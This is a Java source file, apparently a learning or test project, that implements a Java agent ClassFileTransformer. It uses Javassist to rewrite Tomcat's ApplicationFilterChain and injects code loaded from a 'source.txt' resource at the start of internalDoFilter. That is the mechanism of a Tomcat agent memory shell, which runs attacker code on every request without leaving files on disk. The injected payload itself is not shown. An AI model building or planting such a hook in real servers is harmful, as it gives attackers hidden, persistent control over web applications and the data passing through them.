package priv.memshelltest;

import javassist.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (!className.equals("org/apache/catalina/core/ApplicationFilterChain")){
            return classfileBuffer;
        }
        try {
            ClassPool ctpool =ClassPool.getDefault();

            ClassClassPath  cc= new ClassClassPath(classBeingRedefined);
            ctpool.insertClassPath(cc);

            CtClass ctClass =ctpool.get("org/apache/catalina/core/ApplicationFilterChain");
            CtMethod cm = ctClass.getDeclaredMethod("internalDoFilter");

            cm.addLocalVariable("elapsedTime", CtClass.longType); //这一步没懂
            cm.insertBefore(getResource());

            byte [] bytecode =ctClass.toBytecode();
            ctClass.detach();
            return bytecode;
        } catch (Exception e)
        {
            e.printStackTrace();

        }
        return null;
    }

    private String getResource() {

        InputStream input = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader inputStreamReader = new InputStreamReader(input);
        try {
            StringBuilder sb =new StringBuilder() ;
            BufferedReader br = new BufferedReader(inputStreamReader);
            String s;
            while ((s=br.readLine())!=null){
                sb.append(s);
            }
            return  sb.toString();
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
